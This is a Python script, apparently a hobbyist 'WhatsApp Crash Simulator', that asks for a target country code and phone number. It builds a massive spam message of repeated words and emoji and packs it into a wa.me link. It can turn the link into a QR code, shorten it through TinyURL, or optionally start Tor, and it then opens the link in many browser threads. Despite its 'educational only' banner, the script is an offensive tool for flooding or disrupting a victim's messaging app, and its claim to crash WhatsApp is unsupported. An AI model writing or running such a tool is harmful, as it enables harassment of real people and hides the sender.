from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import track
from rich.prompt import Confirm, Prompt
from threading import Thread
from base64 import b64encode
from io import BytesIO
import qrcode
import webbrowser
import time
import os
import requests

console = Console()

# Nettoyage de l'écran
os.system("cls" if os.name == "nt" else "clear")

# Logo stylé
logo = Text("""
████████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗███╗   ██╗ ██████╗ ███╗   ██╗
╚══██╔══╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║  ██║████╗  ██║██╔═══██╗████╗  ██║
   ██║   ██████╔╝███████║███████║██║     ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║
   ██║   ██╔═══╝ ██╔══██║██╔══██║██║     ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║
   ██║   ██║     ██║  ██║██║  ██║╚██████╗██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║
   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝
      [bold cyan]trh4ckn0n - WhatsApp Crash Simulator (Ultra Power Mode)[/bold cyan]
""", style="bold green")
console.print(logo)
console.print(Panel.fit("[bold red]ÉDUCATIF SEULEMENT - Ne jamais utiliser sur un vrai numéro.[/bold red]", title="AVERTISSEMENT"))

# Génère un message très long avec emojis, spam, unicode, etc.
def generate_massive_message():
    base = [
        "*trhacknon*", "BOOM", "CRASH", "WHATSAPP", "SPAM", "██", "▒▒", "░░", 
        "🧨", "💥", "⚠️", "🚫", "⛔", "🚨", "🔥", "⚡", "🛑", "😈", "👾", "👽", 
        "☠️", "🌀", "📛", "🧠", "🔒", "💣", "🔗"
    ]
    repeat_block = "%0A".join([f"{word} " * 10 for word in base])
    return (repeat_block + "%0A") * 30 + "GitHub: https://github.com/trh4ckn0n"

# Création du QR code base64
def generate_qr_link(phone, message):
    msg_encoded = message.replace(" ", "%20").replace("\n", "%0A")
    url = f"https://wa.me/{phone}?text={msg_encoded}"

    qr = qrcode.QRCode(box_size=6, border=2)
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")

    buffer = BytesIO()
    img.save(buffer, format="PNG")
    img_b64 = b64encode(buffer.getvalue()).decode("utf-8")
    return url, img_b64

# Raccourcisseur de lien (utilise tinyurl)
def shorten_link(link):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={link}")
        if r.status_code == 200:
            return r.text
        else:
            return link
    except:
        return link

# Envoi vers l’URL crash via navigateur
def send_crash(phone, message):
    url = f"https://wa.me/{phone}?text={message}"
    webbrowser.open(url)

# Optionnel : Tor
def start_tor():
    os.system("tor &")
    time.sleep(6)
    console.print("[yellow]Tor lancé... Toutes les connexions passent par .onion si compatible.[/yellow]")

def main():
    pays = Prompt.ask("[cyan][?] Code pays (ex: 33 pour FR, 91 pour IN)[/cyan]")
    numero = Prompt.ask("[cyan][?] Numéro WhatsApp cible[/cyan]")
    threads = int(Prompt.ask("[cyan][?] Nombre de threads à lancer (max conseillé: 30)[/cyan]", default="10"))

    target = f"{pays}{numero}"
    message = generate_massive_message()
    encoded = message.replace(" ", "%20").replace("\n", "%0A")

    # Tor mode
    if Confirm.ask("[bold yellow][?] Activer Tor (nécessite tor installé)[/bold yellow]"):
        start_tor()

    # QR code
    if Confirm.ask("[bold yellow][?] Générer un QR Code à scanner pour crash WhatsApp ?[/bold yellow]"):
        link, qr = generate_qr_link(target, message)
        console.print(Panel.fit(f"[bold green]Lien WhatsApp :[/bold green] {link}", title="QR CODE"))
        console.print(f"[bold cyan]QR (base64):[/bold cyan]\n{qr[:150]}...[trunc]")

    # Raccourci lien
    if Confirm.ask("[bold yellow][?] Raccourcir le lien WhatsApp ?[/bold yellow]"):
        short = shorten_link(f"https://wa.me/{target}?text={encoded}")
        console.print(Panel.fit(f"[green]Lien raccourci:[/green] {short}", title="SHORT LINK"))

    # Envoi crash
    console.print(Panel.fit(f"Déclenchement de [bold red]{threads}[/bold red] crash threads sur +{target}", title="LANCEMENT"))
    for _ in track(range(threads), description="[cyan]Crash en cours..."):
        Thread(target=send_crash, args=(target, encoded)).start()
        time.sleep(0.8)

    console.print(Panel.fit(f"[bold green]Crash terminé sur +{target}[/bold green]\n[bold]By trhacknon - usage éducatif uniquement.", title="Succès"))

if __name__ == "__main__":
    main()
